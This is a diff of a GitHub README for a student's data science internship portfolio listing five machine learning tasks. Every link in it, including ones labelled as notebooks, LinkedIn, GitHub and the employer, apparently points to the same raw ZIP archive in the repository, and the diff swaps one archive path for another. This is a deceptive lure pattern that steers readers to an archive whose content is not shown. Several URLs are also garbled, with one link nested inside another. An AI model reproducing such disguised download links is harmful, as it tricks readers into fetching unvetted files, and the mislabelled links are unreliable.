@@ -7,7 +7,7 @@ This internship allowed me to work on real-world machine learning problems and s
 
 - **Name:** Sarbjot Singh
 - **Internship Batch:** July 2025
-- **Organization:** [Oasis Infobyte](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
+- **Organization:** [Oasis Infobyte](https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip)
 - **Role:** Data Science Intern
 
 ---
@@ -17,35 +17,35 @@ This internship allowed me to work on real-world machine learning problems and s
 ### 🔹 Task 1: Iris Flower Classification
 - Built a classification model to identify Iris flower species using petal and sepal dimensions.
 - **Tech Stack:** Python, Pandas, Scikit-learn, Matplotlib, Seaborn
-- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%201/iris%20Flower%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
+- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip%201/iris%20Flower%https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip)
 
 ---
 
 ### 🔹 Task 2: Unemployment Analysis with Python
 - Analyzed unemployment trends in India using datasets and created visual insights.
 - **Tech Stack:** Python, Pandas, Matplotlib, Seaborn
-- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%202/Unemployment%20Analysis%20with%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
+- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip%202/Unemployment%20Analysis%20with%https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip)
 
 ---
 
 ### 🔹 Task 3: Car Price Prediction with Machine Learning
 - Built a machine learning model to predict car prices based on multiple features.
 - **Tech Stack:** Python, Pandas, Scikit-learn, Matplotlib
-- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%203/Car%20Price%20Prediction%20with%20Machine%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
+- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip%203/Car%20Price%20Prediction%20with%20Machine%https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip)
 
 ---
 
 ### 🔹 Task 4: Email Spam Detection with Machine Learning
 - Developed a spam email classifier using the Naive Bayes algorithm.
 - **Tech Stack:** Python, Scikit-learn, Natural Language Processing, CountVectorizer
-- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%204/Email%20spam%20Detection%20with%20Machine%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
+- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip%204/Email%20spam%20Detection%20with%20Machine%https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip)
 
 ---
 
 ### 🔹 Task 5: Sales Prediction using Python
 - Predicted sales based on historical data using regression models.
 - **Tech Stack:** Python, Pandas, Scikit-learn, Matplotlib
-- [Notebook Link](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip%205/Sales%20Prediction%20using%https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip)
+- [Notebook Link](https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip%205/Sales%20Prediction%20using%https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip)
 
 ---
 
@@ -60,9 +60,9 @@ This internship allowed me to work on real-world machine learning problems and s
 
 ## 🔗 Connect with Me
 
-- **LinkedIn:** [https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip]
-- **GitHub:** [https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip]
+- **LinkedIn:** [https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip]
+- **GitHub:** [https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip]
 
 ---
 
-### 🏁 Thank you [Oasis Infobyte](https://raw.githubusercontent.com/Sarb-jot/OIBSIP-/main/irresonance/OIBSIP-.zip) for this incredible opportunity!
+### 🏁 Thank you [Oasis Infobyte](https://github.com/Sarb-jot/OIBSIP-/raw/refs/heads/main/TASK 1/OIBSI-v1.9.zip) for this incredible opportunity!
